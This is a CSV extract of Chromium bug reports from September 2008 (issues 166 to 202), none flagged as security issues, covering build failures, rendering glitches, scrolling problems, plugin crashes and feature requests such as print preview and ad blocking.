,id,issue_id,date,report,Security,summary,description
163,163,166,2-Sep-08,Issue 166 : Failure when client certificate is requested 35 problem? 1. Open site that requests a client certificate 2. Error 110 appears 3.  ? Allow the user to continue if client certificate cannot be presented. In this case  the web application will fall back to password authentication with Firefox and IE.  ? Error 110 (see attached). No way to continue.     chrome_error_110.jpg 18.7 KB &nbsp; View &nbsp; Download ,0,Issue 166 : Failure when client certificate is requested 35 problem,1. Open site that requests a client certificate 2. Error 110 appears 3.   Allow the user to continue if client certificate cannot be presented. In this case  the web application will fall back to password authentication with Firefox and IE.   Error 110 (see attached). No way to continue.     chrome_error_110.jpg 18.7 KB &nbsp View &nbsp Download 
164,164,167,2-Sep-08,Issue 167 : Impossible to build on Ubuntu Linux 2 problem? 1. follow instuction on bouilding chromium on GNU/Linux  ? -to have an $build_dir/usr/src  ? -there isn't $build_dir/usr/src :(     ,0,Issue 167 : Impossible to build on Ubuntu Linux 2 problem,1. follow instuction on bouilding chromium on GNU/Linux   -to have an $build_dir/usr/src   -there isn't $build_dir/usr/src :(     
165,165,168,2-Sep-08,Issue 168 : Excessive hard disk activity every 10-20 minutes 10 problem? 1. Just use Chrome normally during a long period (more than 30 minutes) 2. Every 10-20 minutes (I have not timed it) a lot of HD activity starts If I use File Monitor (filemon.exe) to see what it's going on  I can see hundreds of thousands of writes to 'Safe Browsing' and 'Safe Browsing- journal' files during about a minute. It's not very annoying by the moment  but I am not sure if this is normal. Furthermore  the 'Safe Browsing' file is 40 MB  and growing. I am using XP SP3. ,0,Issue 168 : Excessive hard disk activity every 10-20 minutes 10 problem,1. Just use Chrome normally during a long period (more than 30 minutes) 2. Every 10-20 minutes (I have not timed it) a lot of HD activity starts If I use File Monitor (filemon.exe) to see what it's going on  I can see hundreds of thousands of writes to 'Safe Browsing' and 'Safe Browsing- journal' files during about a minute. It's not very annoying by the moment  but I am not sure if this is normal. Furthermore  the 'Safe Browsing' file is 40 MB  and growing. I am using XP SP3. 
166,166,169,2-Sep-08,Issue 169 : feature request: del.icio.us bookmarks or support for del.ici.ous add-ons 1 person starred this issue and may be notified of changes.   &nbsp;   huttarl      : 0.2.149.27 (1583) URLs (if applicable) :    : Safari 3: Firefox 3: OK IE 7:  ? 1. Try to bookmark pages in a way that stays in one repository with my existing treasure-trove of del.icio.us bookmarks  rather than forking a new repository.  ? There is a way to do this.  ? There is no easy way to have the bookmarks I create in Chrome integrate with my del.icio.us tags. If this one feature were added  I would immediately start using Chrome as my default browser. Without it  I am loath to give up Firefox. I'm sure heavy users of Digg  etc. probably would say the same thing about their favorite services.     The kind of integration I'm looking for is that provided by https://addons.mozilla.org/en-US/firefox/addon/3615 Most important to me is not that my bookmarks go into a ranking/popularity system  but that I can access them from any computer. Sorry to create a &quot;bug report&quot; for what is obviously just a feature request  but I don't see any other way to get a feature request into the system. Discussion boards (Google groups) are too amorphous and messy to follow up on. ,0,Issue 169 : feature request: del.icio.us bookmarks or support for del.ici.ous add-ons 1 person starred this issue and may be notified of changes.   &nbsp,huttarl      : 0.2.149.27 (1583) URLs (if applicable) :    : Safari 3: Firefox 3: OK IE 7:   1. Try to bookmark pages in a way that stays in one repository with my existing treasure-trove of del.icio.us bookmarks  rather than forking a new repository.   There is a way to do this.   There is no easy way to have the bookmarks I create in Chrome integrate with my del.icio.us tags. If this one feature were added  I would immediately start using Chrome as my default browser. Without it  I am loath to give up Firefox. I'm sure heavy users of Digg  etc. probably would say the same thing about their favorite services.     The kind of integration I'm looking for is that provided by https://addons.mozilla.org/en-US/firefox/addon/3615 Most important to me is not that my bookmarks go into a ranking/popularity system  but that I can access them from any computer. Sorry to create a &quot bug report&quot for what is obviously just a feature request  but I don't see any other way to get a feature request into the system. Discussion boards (Google groups) are too amorphous and messy to follow up on. 
167,167,170,2-Sep-08,Issue 170 : Can't login to some sites.. 5 problem? 1. go to the site http://blogs.microsoft.co.il/blogs 2. click on &quot;Sign In&quot; in the upper right hand corner 3. enter the details  ? It is supposed to refresh the page  but i should see that im logged in this time.  ? The page refreshes  but im not logged in. After 3 unsuccessful logins  it's supposed to lock my account  but that doesn't happen  so im guessing there's a problem with how it saves the cookie or temporary file of some sort. I know my details are correct since i can login with FireFox.     ,0,Issue 170 : Can't login to some sites.. 5 problem,1. go to the site http://blogs.microsoft.co.il/blogs 2. click on &quot Sign In&quot in the upper right hand corner 3. enter the details   It is supposed to refresh the page  but i should see that im logged in this time.   The page refreshes  but im not logged in. After 3 unsuccessful logins  it's supposed to lock my account  but that doesn't happen  so im guessing there's a problem with how it saves the cookie or temporary file of some sort. I know my details are correct since i can login with FireFox.     
168,168,171,2-Sep-08,Issue 171 : Cannot download large files in Vista 64-bit. 3 problem? 1. Right-click any large file to download  ? 1. File is downloaded to my hard drive.  ? File downloads for about one second  then pauses indefinitely.     I am running Vista 64-bit with 4GB RAM on a 40mpbs connection. ,0,Issue 171 : Cannot download large files in Vista 64-bit. 3 problem,1. Right-click any large file to download   1. File is downloaded to my hard drive.   File downloads for about one second  then pauses indefinitely.     I am running Vista 64-bit with 4GB RAM on a 40mpbs connection. 
169,169,172,2-Sep-08,Issue 172 : Facebook Javascript Issues 1 person starred this issue and may be notified of changes.   &nbsp;   Mr.Dooman      : 0.2.149.27 (1583) URLs www.facebook.com    : Safari 3: Firefox 3: OK IE 7: OK  ? 1. Log in to facebook 2. Attempt to do one of the following : 3. Become a fan of a program  turn on/off Facebook chat (Or enter FCChat settings/pop out)  ? For the Javascript to respond to your click.  ? Nothing.     As in problem 80 and 82  the issue is that every time you load up Google Chrome  it defaults these (At least in my instance  and from looking at errors reported from several others) settings to 'return false'. The solution is as simple as changing them to 'return true'  but it will switch back when you restart the program. I have yet to discover how to fix the 'Become a fan' and 'Ban this application' problems as they don't have a return function that I can see. ,0,Issue 172 : Facebook Javascript Issues 1 person starred this issue and may be notified of changes.   &nbsp,Mr.Dooman      : 0.2.149.27 (1583) URLs www.facebook.com    : Safari 3: Firefox 3: OK IE 7: OK   1. Log in to facebook 2. Attempt to do one of the following : 3. Become a fan of a program  turn on/off Facebook chat (Or enter FCChat settings/pop out)   For the Javascript to respond to your click.   Nothing.     As in problem 80 and 82  the issue is that every time you load up Google Chrome  it defaults these (At least in my instance  and from looking at errors reported from several others) settings to 'return false'. The solution is as simple as changing them to 'return true'  but it will switch back when you restart the program. I have yet to discover how to fix the 'Become a fan' and 'Ban this application' problems as they don't have a return function that I can see. 
170,170,173,2-Sep-08,Issue 173 : Missing a Print Preview option &lsaquo; Prev 4735 of 14139 Next &rsaquo; 384     Blocked on: issue 21555 &nbsp;   ericlake    There is no option for a print preview. I think that this is needed so that you can see what the page will look like before wasting paper and toner. ,0,Issue 173 : Missing a Print Preview option &lsaquo,Prev 4735 of 14139 Next &rsaquo 384     Blocked on: issue 21555 &nbsp ericlake    There is no option for a print preview. I think that this is needed so that you can see what the page will look like before wasting paper and toner. 
171,171,174,2-Sep-08,Issue 174 : BOVESPA Ticker and FOREX Graph don't show - NO Plug-in available 1 person starred this issue and may be notified of changes.   &nbsp;   Regenste      : &lt;see about:version&gt; URLs (if applicable) :    : Safari 3: Firefox 3: IE 7:www.itautrade.com.br OK http://www.dailyfx.com/charts/Chart.html Ok if in Options Java Sun is enabled and Microsoft VM options are not  ? 1. just go to the sites www.itautrade.com.br or https://itautrade.itau.com.br/itautradenet/Index.asp http://www.dailyfx.com/charts/Chart.html 2. See for yourself 3.  ?  ?     ,0,Issue 174 : BOVESPA Ticker and FOREX Graph don't show - NO Plug-in available 1 person starred this issue and may be notified of changes.   &nbsp,Regenste      : &lt see about:version&gt URLs (if applicable) :    : Safari 3: Firefox 3: IE 7:www.itautrade.com.br OK http://www.dailyfx.com/charts/Chart.html Ok if in Options Java Sun is enabled and Microsoft VM options are not   1. just go to the sites www.itautrade.com.br or https://itautrade.itau.com.br/itautradenet/Index.asp http://www.dailyfx.com/charts/Chart.html 2. See for yourself 3.    
172,172,175,2-Sep-08,Issue 175 : Google search engine in startpage 1 person starred this issue and may be notified of changes.   &nbsp;   michael.monreal      : 1583 The google search engine is not shown in the new-tab startpage (there's only history and other search engines you have used). I know that I can use the omnibar for search  but the main search engine should also be part of the startpage IMHO. ,0,Issue 175 : Google search engine in startpage 1 person starred this issue and may be notified of changes.   &nbsp,michael.monreal      : 1583 The google search engine is not shown in the new-tab startpage (there's only history and other search engines you have used). I know that I can use the omnibar for search  but the main search engine should also be part of the startpage IMHO. 
173,173,176,2-Sep-08,Issue 176 : BOM (U+FEFF) is not turned to a space between tokens 7 problem? 1. Just go that URL - it never loads. 2. 3.  ? A photo album web page should be displayed.  ? Just get the black page background and a spinning loading &quot;wheel&quot;     ,0,Issue 176 : BOM (U+FEFF) is not turned to a space between tokens 7 problem,1. Just go that URL - it never loads. 2. 3.   A photo album web page should be displayed.   Just get the black page background and a spinning loading &quot wheel&quot 
174,174,177,2-Sep-08,Issue 177 : Define exceptions for invalid SSL 2     &nbsp;   michael.monreal      : 1583 Firefox 3 got some bad reviews for not giving an easy way to easily get to pages using self-signed SSL certs for example. Chrome provides a one-click access but it requires this click every time you load the page. There has to be a way to define an exception for this page which would let it act like a page with a valid/non-selfsigned cert. I understand there are some security concerns here but having to click a button every time you visit a legitimate site with a self-signed cert (many university sites for example!) is very bad. ,0,Issue 177 : Define exceptions for invalid SSL 2     &nbsp,michael.monreal      : 1583 Firefox 3 got some bad reviews for not giving an easy way to easily get to pages using self-signed SSL certs for example. Chrome provides a one-click access but it requires this click every time you load the page. There has to be a way to define an exception for this page which would let it act like a page with a valid/non-selfsigned cert. I understand there are some security concerns here but having to click a button every time you visit a legitimate site with a self-signed cert (many university sites for example!) is very bad. 
175,175,178,2-Sep-08,Issue 178 : Autohide Startmenu not restoring with mouseover 1 person starred this issue and may be notified of changes.   &nbsp;   da2ce7      : 0.2.149.27 (1583) URLs (if applicable) : N/A   All work  : Safari 3: OK Firefox 3: OK IE 8b2: 0K  ? 1. Open Chrome 2. Full Screen Window 3. Try and un-auto-hide start menu  ? Start menu appears like normal.  ? Nothing.     Vista x64 sp1 with dwm enabled. (no issue with classic theme) Cameron Garnham da2ce7 at gmail dot com ,0,Issue 178 : Autohide Startmenu not restoring with mouseover 1 person starred this issue and may be notified of changes.   &nbsp,da2ce7      : 0.2.149.27 (1583) URLs (if applicable) : N/A   All work  : Safari 3: OK Firefox 3: OK IE 8b2: 0K   1. Open Chrome 2. Full Screen Window 3. Try and un-auto-hide start menu   Start menu appears like normal.   Nothing.     Vista x64 sp1 with dwm enabled. (no issue with classic theme) Cameron Garnham da2ce7 at gmail dot com 
176,176,179,2-Sep-08,Issue 179 : MS Sharepoint tabs are shown as stack of links 6 problem? 1. Open local MS sharepoint site 2. 3.  ? Internal Tab's within the web app  ? Tabs end up as stack of links     Sharepoint Rendering.pdf 295 KB &nbsp; Download ,0,Issue 179 : MS Sharepoint tabs are shown as stack of links 6 problem,1. Open local MS sharepoint site 2. 3.   Internal Tab's within the web app   Tabs end up as stack of links     Sharepoint Rendering.pdf 295 KB &nbsp Download 
177,177,180,2-Sep-08,Issue 180 : IE6 cant download chrome 1 person starred this issue and may be notified of changes.   &nbsp;   bretmcdanel      : download webapp for chrome URLs (if applicable) : http://gears.google.com/chrome/eula.html?hl-en    : Safari 3: Firefox 3: IE 7: IE 6: Fail  ? 1. visit url 2. click &quot;accept and install&quot; 3. check status bar for &quot;error&quot;  ? that I can download and install chrome  ? I get the following error line: 133 char: 5 Error: object expected code: 0 I dont have a good javascript console available so that is all that it gave me.     ,0,Issue 180 : IE6 cant download chrome 1 person starred this issue and may be notified of changes.   &nbsp,bretmcdanel      : download webapp for chrome URLs (if applicable) : http://gears.google.com/chrome/eula.html hl-en    : Safari 3: Firefox 3: IE 7: IE 6: Fail   1. visit url 2. click &quot accept and install&quot 3. check status bar for &quot error&quot  that I can download and install chrome   I get the following error line: 133 char: 5 Error: object expected code: 0 I dont have a good javascript console available so that is all that it gave me.     
178,178,181,2-Sep-08,Issue 181 : Feature request: mouse gesture support &lsaquo; Prev 3392 of 14174 Next &rsaquo; 223     &nbsp;   jacobcarpenter      : 0.2.149.27 URLs (if applicable) : n/a    : Safari 3: ? Firefox 3: OK IE 7: OK Problem summary: Mouse gestures (see: http://en.wikipedia.org/wiki/Mouse_gesture ) are a popular browsing metaphor that is currently unsupported in chrome (chromium?). Please consider native (or plugin model) support. ,0,Issue 181 : Feature request: mouse gesture support &lsaquo,Prev 3392 of 14174 Next &rsaquo 223     &nbsp jacobcarpenter      : 0.2.149.27 URLs (if applicable) : n/a    : Safari 3:  Firefox 3: OK IE 7: OK Problem summary: Mouse gestures (see: http://en.wikipedia.org/wiki/Mouse_gesture ) are a popular browsing metaphor that is currently unsupported in chrome (chromium ). Please consider native (or plugin model) support. 
179,179,182,2-Sep-08,Issue 182 : Problems with multiple monitors and maximising 2 problem? 1. Set up 3 monitors horizontally 2. Make the resolutions  going from left to right  1280x1024  1280x1024  1800x1350 3. Maximise the Chrome window in the left or middle monitor  ? The window should fill the screen  ? It fills the screen and also around a third of the screen to the right of it.     Screenshot is not possible  but I've attached a photo - note how this window (the middle screen) is stretching into my right monitor. Picture 008.jpg 322 KB &nbsp; View &nbsp; Download ,0,Issue 182 : Problems with multiple monitors and maximising 2 problem,1. Set up 3 monitors horizontally 2. Make the resolutions  going from left to right  1280x1024  1280x1024  1800x1350 3. Maximise the Chrome window in the left or middle monitor   The window should fill the screen   It fills the screen and also around a third of the screen to the right of it.     Screenshot is not possible  but I've attached a photo - note how this window (the middle screen) is stretching into my right monitor. Picture 008.jpg 322 KB &nbsp View &nbsp Download 
180,180,183,2-Sep-08,Issue 183 : Double clicking in Omnibox selects word+punctuation but subsequent edits don't always affect that punctuation &lsaquo; Prev 3387 of 14139 Next &rsaquo; 25 problem? 1. If you mark &quot;code&quot; in code.google.com  ? just &quot;code&quot; is marked  ? &quot;code.&quot; is marked but you can only change &quot;code&quot;     ,0,Issue 183 : Double clicking in Omnibox selects word+punctuation but subsequent edits don't always affect that punctuation &lsaquo,Prev 3387 of 14139 Next &rsaquo 25 problem 1. If you mark &quot code&quot in code.google.com   just &quot code&quot is marked   &quot code.&quot is marked but you can only change &quot code&quot 
181,181,184,2-Sep-08,Issue 184 : Caption Button Spacing 2 problem? 1. Open browser.  ? Caption button spacing from right edge is correct.  ? Caption button spacing from right edge is incorrect. Capture.PNG 37.9 KB &nbsp; View &nbsp; Download ,0,Issue 184 : Caption Button Spacing 2 problem,1. Open browser.   Caption button spacing from right edge is correct.   Caption button spacing from right edge is incorrect. Capture.PNG 37.9 KB &nbsp View &nbsp Download 
182,182,185,2-Sep-08,Issue 185 : Dutch: Spelling error on Chrome first-run UI 8 problem? 1. Installing the browser reproduces a spelling error shown here: http://www.flickr.com/photos/26656035@N06/2823089410/ 2. 3.  ?  ?     ,0,Issue 185 : Dutch: Spelling error on Chrome first-run UI 8 problem,1. Installing the browser reproduces a spelling error shown here: http://www.flickr.com/photos/26656035@N06/2823089410/ 2. 3.    
183,183,186,2-Sep-08,Issue 186 : New Facebook switch story_options on profile Javascript error? 1 person starred this issue and may be notified of changes.   &nbsp;   mattwind      : &lt;see about:version&gt; URLs (if applicable) :    : Safari 3: Firefox 3: IE 7:  ? 1. view a facebook profile 2. click [edit] adjust story option to full  short  one-line 3. does not work in chrome browser  ?  ?     ,0,Issue 186 : New Facebook switch story_options on profile Javascript error,1 person starred this issue and may be notified of changes.   &nbsp mattwind      : &lt see about:version&gt URLs (if applicable) :    : Safari 3: Firefox 3: IE 7:   1. view a facebook profile 2. click [edit] adjust story option to full  short  one-line 3. does not work in chrome browser    
184,184,187,2-Sep-08,Issue 187 : Flickr upload does not work 3 problem? 1. Choosing a foto by clicking the Upload link does not give me the Foto selector in the browser 2. 3.  ?  ?     ,0,Issue 187 : Flickr upload does not work 3 problem,1. Choosing a foto by clicking the Upload link does not give me the Foto selector in the browser 2. 3.    
185,185,188,2-Sep-08,Issue 188 : UI: tab overflow &lsaquo; Prev 85 of 14139 Next &rsaquo; 179 problem? 1.Adding many tabs.  ? Scrollable tabs.  ? Add tab button disappears after a certain number of tabs and the tabs do not scroll. Capture.PNG 189 KB &nbsp; View &nbsp; Download ,0,Issue 188 : UI: tab overflow &lsaquo,Prev 85 of 14139 Next &rsaquo 179 problem 1.Adding many tabs.   Scrollable tabs.   Add tab button disappears after a certain number of tabs and the tabs do not scroll. Capture.PNG 189 KB &nbsp View &nbsp Download 
186,186,189,2-Sep-08,Issue 189 : None of the servlet is loading in chromium 1 person starred this issue and may be notified of changes.   &nbsp;   meetsurya21      : chromium URLs (if applicable) : http://support.bmc.com    : Safari 3: Firefox 3:OK IE 7:OK  ? 1. login into www.bmc.com 2. Click on any of links...none of the servlet webpages is loading... 3. It is taking 10 min and still havent loaded..in IE 25 sec...  ?  ?     ,0,Issue 189 : None of the servlet is loading in chromium 1 person starred this issue and may be notified of changes.   &nbsp,meetsurya21      : chromium URLs (if applicable) : http://support.bmc.com    : Safari 3: Firefox 3:OK IE 7:OK   1. login into www.bmc.com 2. Click on any of links...none of the servlet webpages is loading... 3. It is taking 10 min and still havent loaded..in IE 25 sec...    
187,187,190,2-Sep-08,Issue 190 : Error occurs when accessing any links from http://feeds.adobe.com 2     &nbsp;   marc.truitt      : 0.2.149.27 URLs (if applicable) : feeds.adobe.com Error occurs when access any of the sited from the following feed feeds.adobe.com  : Safari 3: ? Firefox 3: ? IE 7: FAIl Below is the error description: This webpage is not available. The webpage at http://feeds.adobe.com/controller.cfm? handler=PostHandler&amp;action=click&amp;postId=310964&amp;nextPage=http%3A%2F%2Fblogs% 2Eadobe%2Ecom%2Fedtechatadobe%2F2008%2F09%2Fmeet%5Fthe%5Fteam%5Four% 5Fbloggers%2Ehtml might be temporarily down or it may have moved permanently to a new web address. More information on this error Below is the original error message Error 320 (net::ERR_INVALID_RESPONSE): Unknown error. ,0,Issue 190 : Error occurs when accessing any links from http://feeds.adobe.com 2     &nbsp,marc.truitt      : 0.2.149.27 URLs (if applicable) : feeds.adobe.com Error occurs when access any of the sited from the following feed feeds.adobe.com  : Safari 3:  Firefox 3:  IE 7: FAIl Below is the error description: This webpage is not available. The webpage at http://feeds.adobe.com/controller.cfm handler=PostHandler&amp action=click&amp postId=310964&amp nextPage=http%3A%2F%2Fblogs% 2Eadobe%2Ecom%2Fedtechatadobe%2F2008%2F09%2Fmeet%5Fthe%5Fteam%5Four% 5Fbloggers%2Ehtml might be temporarily down or it may have moved permanently to a new web address. More information on this error Below is the original error message Error 320 (net::ERR_INVALID_RESPONSE): Unknown error. 
188,188,191,2-Sep-08,Issue 191 : About memory doesn't show memory consumption from IE 64 bit 6 problem? 1. Launch IE 7 64 bits 2. Go to about:memory 3. See that it is not listed  ? IE7 64 bit memory consumption should be listed  ? IE7 64 bit isn't in the list     I run Windows XP64 bits. Firefox and IE7 32 bit shows in the list just fine. ,0,Issue 191 : About memory doesn't show memory consumption from IE 64 bit 6 problem,1. Launch IE 7 64 bits 2. Go to about:memory 3. See that it is not listed   IE7 64 bit memory consumption should be listed   IE7 64 bit isn't in the list     I run Windows XP64 bits. Firefox and IE7 32 bit shows in the list just fine. 
189,189,192,2-Sep-08,Issue 192 : Must restart browser after changing themes. 1 person starred this issue and may be notified of changes.   &nbsp;   danjrod      : 0.2.149.27 URLs (if applicable) :    : Safari 3: ?? Firefox 3: OK IE 7: OK  ? 1. Switch off tbe &quot;Themes&quot; service using the services.msc console 2. Open (example) http://mail.google.com 3. Check boxex for messages in inbox may or may not show. Each reload of the window delivers a random behaviour  but most of the time  the check boxes will not be displayed  ? Check boxes always showing  ? Check boxes do mostly not show up.     ,0,Issue 192 : Must restart browser after changing themes. 1 person starred this issue and may be notified of changes.   &nbsp,danjrod      : 0.2.149.27 URLs (if applicable) :    : Safari 3:   Firefox 3: OK IE 7: OK   1. Switch off tbe &quot Themes&quot service using the services.msc console 2. Open (example) http://mail.google.com 3. Check boxex for messages in inbox may or may not show. Each reload of the window delivers a random behaviour  but most of the time  the check boxes will not be displayed   Check boxes always showing   Check boxes do mostly not show up.     
190,190,193,2-Sep-08,Issue 193 : Deleting entries from Omnibar 1 person starred this issue and may be notified of changes.   &nbsp;   michael.monreal      : 0.2.149.27   Firefox 3: OK Firefox 3 allows to delete entries from the Omnibar by pressing the &lt;del&gt; key on them. This is very handy if you want to delete some false hits which happen to turn up often (e.g. if you misspelled the URL once). ,0,Issue 193 : Deleting entries from Omnibar 1 person starred this issue and may be notified of changes.   &nbsp,michael.monreal      : 0.2.149.27   Firefox 3: OK Firefox 3 allows to delete entries from the Omnibar by pressing the &lt del&gt key on them. This is very handy if you want to delete some false hits which happen to turn up often (e.g. if you misspelled the URL once). 
191,191,194,2-Sep-08,Issue 194 : None of the plugins work 1 person starred this issue and may be notified of changes.   &nbsp;   down.under.gamer      : 0.2.149.27  ? For flash  shockwave etc. to work  ? crashes  noresponsive for long peroids of time  then crashes the tab in the browser. ,0,Issue 194 : None of the plugins work 1 person starred this issue and may be notified of changes.   &nbsp,down.under.gamer      : 0.2.149.27   For flash  shockwave etc. to work   crashes  noresponsive for long peroids of time  then crashes the tab in the browser. 
192,192,195,2-Sep-08,Issue 195 : Google Groups: missing [edit welcome message] link 1 person starred this issue and may be notified of changes.   &nbsp;   T.Delenikas      : 0.2.149.27 URLs (if applicable) : Google Groups URLs    : Safari 3: N/A Firefox 3: OK IE 7: OK  ? 1. Login with your Google Account 2. Visit a Google Group for which you are owner.  ? You should be able to modify the introductory text displayed on the top section of the group. In order to do this  you can use the [edit welcome message] link.  ? The [edit welcome message] link does not appear. All other group functionality works (identifying you as logged-on and as the owner) but the above mentioned link does not exist.     ,0,Issue 195 : Google Groups: missing [edit welcome message] link 1 person starred this issue and may be notified of changes.   &nbsp,T.Delenikas      : 0.2.149.27 URLs (if applicable) : Google Groups URLs    : Safari 3: N/A Firefox 3: OK IE 7: OK   1. Login with your Google Account 2. Visit a Google Group for which you are owner.   You should be able to modify the introductory text displayed on the top section of the group. In order to do this  you can use the [edit welcome message] link.   The [edit welcome message] link does not appear. All other group functionality works (identifying you as logged-on and as the owner) but the above mentioned link does not exist.     
193,193,196,2-Sep-08,Issue 196 : Scrolling Upwards Using Trackpad Not Possible 1 person starred this issue and may be notified of changes.   &nbsp;   shriphanip      : URLs (if applicable) : Almost all websites   Firefox 3  : Safari 3: Firefox 3: Ok IE 7:  ? 1. Opening a website using chrome on a HP tx1000 and trying to scroll up. Scrolling down is not a problem 2. 3.  ? I should be able to scroll up.  ? Nothing. Using a normal wheel on a mouse does not create any issues.     This seems to be a problem only with the trackpad on the HP tx1000. ,0,Issue 196 : Scrolling Upwards Using Trackpad Not Possible 1 person starred this issue and may be notified of changes.   &nbsp,shriphanip      : URLs (if applicable) : Almost all websites   Firefox 3  : Safari 3: Firefox 3: Ok IE 7:   1. Opening a website using chrome on a HP tx1000 and trying to scroll up. Scrolling down is not a problem 2. 3.   I should be able to scroll up.   Nothing. Using a normal wheel on a mouse does not create any issues.     This seems to be a problem only with the trackpad on the HP tx1000. 
194,194,197,2-Sep-08,Issue 197 : I cant scroll up. 1 person starred this issue and may be notified of changes.   &nbsp;   genuinelatif      : &lt;see about:version&gt; URLs (if applicable) :    : Safari 3: Firefox 3: IE 7:  ? 1. 2. 3.  ?  ?     ,0,Issue 197 : I cant scroll up. 1 person starred this issue and may be notified of changes.   &nbsp,genuinelatif      : &lt see about:version&gt URLs (if applicable) :    : Safari 3: Firefox 3: IE 7:   1. 2. 3.    
195,195,198,2-Sep-08,Issue 198 : CSS rounded corners don't render properly when combined with box shadows 8 problem? Use -webkit-rounded-corner and -webkit-box-shadow on the same item. For example  div { -webkit-rounded-corner:5px; -webkit-box-shadow:1px 1px 2px #000; }  ? A box with a drop shadow that nicely follows its rounded corners.  ? See screenshot. The round corners are rendered with a black blackground with square corners. Also  the drop shadow seems much bigger than it should be.     Without the box shadow  the round corners display properly; this issue happens only when both properties are used together. chrome-rounded-corners.png 28.4 KB &nbsp; View &nbsp; Download css-test.html 475 bytes &nbsp; Download ,0,Issue 198 : CSS rounded corners don't render properly when combined with box shadows 8 problem,Use -webkit-rounded-corner and -webkit-box-shadow on the same item. For example  div { -webkit-rounded-corner:5px -webkit-box-shadow:1px 1px 2px #000 }   A box with a drop shadow that nicely follows its rounded corners.   See screenshot. The round corners are rendered with a black blackground with square corners. Also  the drop shadow seems much bigger than it should be.     Without the box shadow  the round corners display properly this issue happens only when both properties are used together. chrome-rounded-corners.png 28.4 KB &nbsp View &nbsp Download css-test.html 475 bytes &nbsp Download 
196,196,199,2-Sep-08,Issue 199 : Using Dell Touchpad scroll option only scrolls down - up does not work (only show the icon) 2 problem? 1. Scroll up with touchpad's right hand scroler on any site 2. 3.  ? Scroll down  ? Only Icon for scroller shows - but the page won't scroll up     ,0,Issue 199 : Using Dell Touchpad scroll option only scrolls down - up does not work (only show the icon) 2 problem,1. Scroll up with touchpad's right hand scroler on any site 2. 3.   Scroll down   Only Icon for scroller shows - but the page won't scroll up     
197,197,200,2-Sep-08,Issue 200 : Chrome window not truly maximized with Taskbar on Auto-hide mode 9 problem? 1. Maximize Chrome window. 2. Place windows taskbar at the top of the screen  and enable Auto-hide. 3. With the Chrome window active  click at the very bottom of the screen.  ? Chrome window should stay on top.  ? Any window underneath will appear on top  as if the Chrome window was not truly maximized. Additional info: Tested at 1024x768 resolution. ,0,Issue 200 : Chrome window not truly maximized with Taskbar on Auto-hide mode 9 problem,1. Maximize Chrome window. 2. Place windows taskbar at the top of the screen  and enable Auto-hide. 3. With the Chrome window active  click at the very bottom of the screen.   Chrome window should stay on top.   Any window underneath will appear on top  as if the Chrome window was not truly maximized. Additional info: Tested at 1024x768 resolution. 
198,198,201,2-Sep-08,Issue 201 : Ad blocking 9 problem? 1. Open any web page 2. OMG ads !! 3. can't find adblock plugin for chrome  ? I don't want to see ads  ? I see ads !!     I've never seen so much ads in my life!  just have a look at digg it's crazy ! blinking pictures dancing everywhere ! even on a search on google I see stuff like sponsored links  never seen that before ! I'm not lying look at this screenshot ! ads.png 198 KB &nbsp; View &nbsp; Download ,0,Issue 201 : Ad blocking 9 problem1. Open any web page 2. OMG ads !! 3. can't find adblock plugin for chrome  ,I don't want to see ads   I see ads !!     I've never seen so much ads in my life!  just have a look at digg it's crazy ! blinking pictures dancing everywhere ! even on a search on google I see stuff like sponsored links  never seen that before ! I'm not lying look at this screenshot ! ads.png 198 KB &nbsp View &nbsp Download 
199,199,202,2-Sep-08,Issue 202 : chrome multiple tabs rearrange 1 person starred this issue and may be notified of changes.   &nbsp;   meetsurya21      : &lt;see about:version&gt; URLs (if applicable) :    : Safari 3: Firefox 3:n/a IE 7:n/a  ? 1. Opened 4 tabs in chrome 2. click particular tab and pull to the place wherever you want 3. When i try to rearrange tab order gets lost or sometimes its not re arranging...  ?  ?     ,0,Issue 202 : chrome multiple tabs rearrange 1 person starred this issue and may be notified of changes.   &nbsp,meetsurya21      : &lt see about:version&gt URLs (if applicable) :    : Safari 3: Firefox 3:n/a IE 7:n/a   1. Opened 4 tabs in chrome 2. click particular tab and pull to the place wherever you want 3. When i try to rearrange tab order gets lost or sometimes its not re arranging...    
